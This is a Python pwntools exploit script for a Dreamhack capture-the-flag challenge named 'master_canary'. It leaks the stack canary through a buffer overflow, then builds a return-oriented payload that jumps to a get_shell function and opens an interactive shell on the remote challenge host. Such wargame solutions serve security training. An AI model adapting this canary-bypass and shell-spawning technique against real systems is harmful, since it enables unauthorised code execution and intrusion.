from pwn import *

p = remote("host3.dreamhack.games", 17351)
e = ELF("./master_canary")
rop = ROP(e)

get_shell = e.symbols["get_shell"]
ret = rop.find_gadget(["ret"]).address

payload = b"A" * 0x8e8
payload += b"B"

p.sendlineafter(b"> ", b"1")

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Size: ", str(len(payload)).encode())
p.sendafter(b"Data: ", payload)

p.recvuntil(b"Data: ")
p.recvuntil(payload)

leaked = p.recvn(7)
log.info(f"raw leaked: {leaked.hex()}")

canary = u64(b"\x00" + leaked)
log.info(f"Leaked canary: {hex(canary)}")

payload2 = b"A" * 0x28
payload2 += p64(canary)
payload2 += b"C" * 8
payload2 += p64(ret)
payload2 += p64(get_shell)

p.sendlineafter(b"> ", b"3")
p.sendafter(b"Leave comment: ", payload2)

p.interactive()